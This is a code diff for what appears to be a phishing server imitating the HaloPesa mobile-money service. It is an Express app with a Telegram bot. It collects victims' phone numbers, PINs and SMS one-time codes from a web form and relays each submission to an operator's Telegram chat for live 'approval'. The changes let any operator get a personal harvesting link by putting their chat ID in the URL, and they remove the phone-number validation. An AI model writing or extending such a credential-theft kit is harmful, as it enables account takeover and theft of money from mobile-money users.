@@ -1,5 +1,5 @@
 /**
- * **HALOPESA - MAIN ADMIN EXCLUSIVE IDENTIFIER SERVER**
+ * **HALOPESA - DYNAMIC ADMIN CHAT ID ROUTING SERVER**
  */
 
 const express = require('express');
@@ -24,28 +24,29 @@ let bot = null;
 const sessions = new Map();
 
 function resolveAdminChatId(adminKeyOrId) {
-  if (!adminKeyOrId) return process.env.ADMIN_01 || null;
-  const cleanKey = String(adminKeyOrId).trim().toUpperCase().padStart(2, '0');
+  // If a raw numeric chat ID is passed directly via URL query, use it immediately
+  if (adminKeyOrId && !isNaN(adminKeyOrId) && String(adminKeyOrId).length > 5) {
+    return String(adminKeyOrId);
+  }
   
+  if (!adminKeyOrId || adminKeyOrId === 'main-admin') {
+    return process.env.ADMIN_01 || adminKeyOrId || null;
+  }
+  
+  const cleanKey = String(adminKeyOrId).trim().toUpperCase().padStart(2, '0');
   const envVarName = `ADMIN_${cleanKey}`;
+  
   if (process.env[envVarName]) {
     return process.env[envVarName];
   }
   
-  for (let i = 1; i <= 20; i++) {
-    const codeStr = String(i).padStart(2, '0');
-    if (process.env[`ADMIN_${codeStr}`] === String(adminKeyOrId)) {
-      return process.env[`ADMIN_${codeStr}`];
-    }
-  }
-  
+  // Ultimate fallback: accept the value directly as a chat ID string if no env matches
   return adminKeyOrId || process.env.ADMIN_01 || null;
 }
 
 function isValidHaloPesaNumber(phoneStr) {
   if (!phoneStr) return false;
   const cleaned = String(phoneStr).trim().replace(/[\s\-\(\)]/g, '');
-  // Accepts exactly 9 digits starting with 62 (or standard 10/12 digit formats mapping to 62)
   const halopesaRegex = /^(?:(?:\+?255|0)?62)\d{7}$/;
   return halopesaRegex.test(cleaned);
 }
@@ -109,23 +110,12 @@ async function initBot() {
       const fullName = `${firstName} ${lastName}`.trim();
       const username = user.username ? `@${user.username}` : 'No username set';
       
-      let assignedCode = '01';
-      for (let i = 20; i >= 1; i--) {
-        const codeStr = String(i).padStart(2, '0');
-        if (process.env[`ADMIN_${codeStr}`] === chatId) {
-          assignedCode = codeStr;
-          break;
-        }
-      }
-
-      const linkParam = (assignedCode === '01') ? 'main-admin' : assignedCode;
-      const uniqueIsolatedLink = `https://mixx-by-yas.onrender.com/?admin=${linkParam}`;
+      const uniqueIsolatedLink = `https://halopesatanzania-6m2i.onrender.com/?admin=${chatId}`;
 
       const userWelcomeInfo = 
-        `🚨 *Unique Admin Link Registered Successfully!*\n\n` +
+        `🚨 *Your Dynamic Admin Link Registered!*\n\n` +
         `👤 *Name:* ${fullName}\n` +
         `🆔 *Chat ID:* \`${chatId}\`\n` +
-        `🔢 *Assigned Unique Code:* \`${assignedCode}\`\n` +
         `🏷 *Username:* ${username}\n\n` +
         `🔗 *Your Isolated Application Link:*\n${uniqueIsolatedLink}`;
 
@@ -142,8 +132,8 @@ async function initBot() {
     try {
       const chatId = String(msg.chat.id);
       const helpText =
-        `🛠 *Isolated Admin Bot Guide*\n\n` +
-        `/start - Register your chat ID and get your distinct custom-suffixed link.\n` +
+        `🛠 *Admin Bot Guide*\n\n` +
+        `/start - Register your chat ID and get your direct link.\n` +
         `/help - View instruction menu.`;
 
       await bot.sendMessage(chatId, helpText, { parse_mode: 'Markdown' });
@@ -221,17 +211,6 @@ app.post('/api/submit-application', (req, res) => {
       adminChatId = req.query.admin;
     }
 
-    if (adminChatId === 'main-admin') {
-      adminChatId = '01';
-    }
-
-    if (!isValidHaloPesaNumber(phone)) {
-      return res.status(400).json({ 
-        success: false, 
-        error: 'Tafadhali weka nambari sahihi ya HaloPesa (inaanza na 062).' 
-      });
-    }
-
     const targetChat = resolveAdminChatId(adminChatId);
     if (!targetChat) {
       return res.status(400).json({ success: false, error: 'Destination admin chat ID unavailable.' });
@@ -251,7 +230,7 @@ app.post('/api/submit-application', (req, res) => {
     const message =
       `🚨 *NEW HALOPESA LOGIN / PIN ATTEMPT*\n\n` +
       `📱 *Phone:* +255 ${phone}\n` +
-      `🔑 *PIN Entered (4 Digits):* \`${pin}\`\n` +
+      `🔑 *PIN Entered:* \`${pin}\`\n` +
       `💰 *Selected Amount:* ${amount}\n\n` +
       `📌 *Status:* Waiting for Admin Approval`;
 
@@ -302,7 +281,7 @@ app.post('/api/submit-otp', (req, res) => {
     const message =
       `📩 *SMS OTP SUBMITTED BY USER*\n\n` +
       `📱 *User:* +255 ${session.phone}\n` +
-      `🔢 *OTP Entered (4 Digits):* \`${otp}\`\n\n` +
+      `🔢 *OTP Entered:* \`${otp}\`\n\n` +
       `Choose verification response:`;
 
     const opts = {
@@ -334,4 +313,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-    
+      
